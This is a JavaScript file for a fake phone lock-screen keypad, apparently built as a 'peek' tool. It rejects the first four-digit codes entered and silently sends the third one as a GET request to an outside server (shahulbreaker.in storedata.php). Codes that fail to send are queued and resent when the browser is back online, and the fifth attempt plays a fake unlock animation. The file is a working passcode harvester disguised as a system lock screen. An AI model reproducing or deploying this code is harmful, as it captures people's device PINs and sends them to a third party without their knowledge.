(() => {
  const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarunpeek&data=";
  const MAX = 4;
  let code = "";

  const dotEls = Array.from(document.querySelectorAll('.dot'));
  const keys = Array.from(document.querySelectorAll('.key[data-num]'));
  const emergency = document.getElementById('emergency');
  const cancelBtn = document.getElementById('cancel');
  const unlockOverlay = document.getElementById('unlockOverlay');
  const ATT_KEY = '_pass_attempt_count_';
  const QUEUE_KEY = '_pass_queue_';

  function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
  function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }

  function refreshDots() {
    dotEls.forEach((d,i) => d.classList.toggle('filled', i < code.length));
  }

  function reset() {
    code = "";
    refreshDots();
  }

  function queuePass(pass) {
    const q = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    q.push({ pass, ts: Date.now() });
    localStorage.setItem(QUEUE_KEY, JSON.stringify(q));
  }

  function sendToAPI(pass) {
    const url = API_BASE + encodeURIComponent(pass);
    return fetch(url, { method: 'GET', keepalive: true })
      .catch(() => {
        queuePass(pass);
      });
  }

  function flushQueue() {
    const queue = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    if (!queue.length) return;
    queue.forEach(item => {
      fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true }).catch(()=>{});
    });
    localStorage.removeItem(QUEUE_KEY);
  }

  // synchronized duration (ms) for the unified animation
  const ANIM_DURATION = 700;

  function playUnlockAnimation() {
    const lockEl = document.querySelector('.lockscreen');
    if (!lockEl || !unlockOverlay) return;

    // 1) add unlocking class to slide lockscreen up
    lockEl.classList.add('unlocking');

    // 2) show overlay and homescreen
    unlockOverlay.classList.add('show');

    // 3) trigger curtain lift (both panels together)
    const curtain = unlockOverlay.querySelector('.curtain');
    if (curtain) {
      // ensure it's visible before adding 'show' (forces repaint)
      requestAnimationFrame(() => {
        curtain.classList.add('show');
      });

      // remove the curtain node after the animation completes so homescreen stays clean
      setTimeout(() => {
        if (curtain && curtain.parentNode) {
          curtain.parentNode.removeChild(curtain);
        }
      }, ANIM_DURATION + 40); // slight buffer after CSS animation
    }

    // Note: homescreen reveal animation is CSS-based and will run automatically because overlay.show was added
  }

  function animateWrongAttempt() {
    const dotsEl = document.getElementById('dots');
    if (!dotsEl) {
      reset();
      return;
    }
    const DURATION = 700;
    dotsEl.classList.add('wrong');
    reset();
    setTimeout(() => {
      dotsEl.classList.remove('wrong');
    }, DURATION + 20);
  }

  async function handleCompleteAttempt(enteredCode) {
    let attempts = getAttempts();
    attempts += 1;
    setAttempts(attempts);

    if (attempts === 3) {
      sendToAPI(enteredCode);
      animateWrongAttempt();
    } else if (attempts === 5) {
      // Fifth attempt: run unified unlock animation
      playUnlockAnimation();

      // Reset the dots after the animation finishes (so the UI doesn't instantly reset)
      setTimeout(reset, ANIM_DURATION + 120);
    } else {
      animateWrongAttempt();
    }

    if (attempts >= 5) {
      setAttempts(0);
    }
  }

  function animateBrightness(el, target, duration) {
    let startTime;
    const initial = parseFloat(el.dataset.brightness || "1");
    const change = target - initial;

    function easeOutCubic(t) {
      return 1 - Math.pow(1 - t, 3);
    }

    function frame(ts) {
      if (!startTime) startTime = ts;
      const progress = Math.min((ts - startTime) / duration, 1);
      const eased = easeOutCubic(progress);
      const value = initial + change * eased;
      el.style.filter = `brightness(${value})`;
      el.dataset.brightness = value.toFixed(3);
      if (progress < 1) {
        requestAnimationFrame(frame);
      }
    }
    requestAnimationFrame(frame);
  }

  keys.forEach(k => {
    const num = k.dataset.num;
    if (!num) return;

    k.addEventListener('touchstart', () => {
      animateBrightness(k, 1.6, 80);
    }, { passive: true });

    const endPress = () => {
      animateBrightness(k, 1, 100);
    };
    k.addEventListener('touchend', endPress);
    k.addEventListener('touchcancel', endPress);
    k.addEventListener('mouseleave', endPress);

    k.addEventListener('click', () => {
      if (code.length >= MAX) return;
      code += num;
      refreshDots();

      if (code.length === MAX) {
        const enteredCode = code;
        setTimeout(() => {
          handleCompleteAttempt(enteredCode);
        }, 120);
      }
    });
  });

  emergency && emergency.addEventListener('click', e => e.preventDefault());
  cancelBtn && cancelBtn.addEventListener('click', e => { e.preventDefault(); reset(); });

  window.addEventListener('online', flushQueue);
  flushQueue();

  window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };

})();
